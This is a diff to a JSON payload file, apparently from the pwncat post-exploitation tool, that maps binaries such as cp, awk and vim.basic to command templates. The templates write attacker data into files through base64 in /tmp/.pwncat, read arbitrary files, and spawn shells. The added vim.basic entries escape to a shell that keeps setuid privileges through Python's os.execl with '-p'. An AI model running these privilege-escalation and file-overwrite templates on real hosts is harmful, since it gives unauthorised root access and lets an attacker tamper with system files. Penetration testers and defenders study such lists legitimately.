@@ -7,7 +7,7 @@
 		"name": "cp",
 		"write_file": {
 			"type": "base64",
-			"payload": "TF=/tmp/.pwncat; echo {data} | {base64} -d > $TF; {path} $TF ${lfile}; {unlink} $TF"
+			"payload": "TF=/tmp/.pwncat; echo {data} | {base64} -d > $TF; {path} $TF {lfile}; {unlink} $TF"
 		}
 	},
 	{
@@ -67,7 +67,7 @@
 		"read_file": "{path} '//' {lfile}",
 		"write_file": {
 			"type": "base64",
-			"payload": "{path} -v LFILE={lfile} 'BEGIN {{ printf \"\" > LFILE; while ((\"echo \\\"{data}\\\" | base64 -d\" | getline) > 0){{ print >> LFILE }} }}'"
+			"payload": "{path} -v LFILE={lfile} 'BEGIN {{ printf \"\" > LFILE; while ((\"echo \\\"{data}\\\" | {base64} -d\" | getline) > 0){{ print >> LFILE }} }}'"
 		}
 	},
 	{
@@ -141,16 +141,28 @@
 		"command": "{path} -p -c {command}"
 	},
 	{
-		"name": "vim",
+		"name": "vim.basic",
 		"shell": {
-			"script": "{command}", 
-			"suid": ["-p"]
+
+			"need" : ["-e", "+:py3 import os; os.execl(\"{shell}\", \"{shell}\", \"-pc\", \"{reset}; exec {shell} -p\")", "+q!"]
+		}
+	},
+	{
+		"name": "vim.basic",
+		"shell": {
+			"need" : ["-e", "+:py import os; os.execl(\"{shell}\", \"{shell}\", \"-c\", \"{reset}; exec {shell}\")", "+q!"]
+		}
+	},
+	{
+		"name": "vim.basic",
+		"shell": {
+			"need" : ["-e", "+:!{shell}", "+q!"]
 		},
-		"read_file": "{path} -p -c \"cat {lfile}\"",
+		"read_file": "{path} {lfile} -es '+%print' '+:q!' /dev/stdin",
 		"write_file": {
 			"type": "base64",
-			"payload": "{path} -p -c \"echo -n {data} | base64 -d > {lfile}\""
+			"payload": "echo {data} | base64 -d | {path} -es '+%print' '+:wq! {lfile}' /dev/stdin"
 		},
-		"command": "{path} -p -c {command}"
+		"command": "{path} -c ':!{command}'"
 	}
 ]
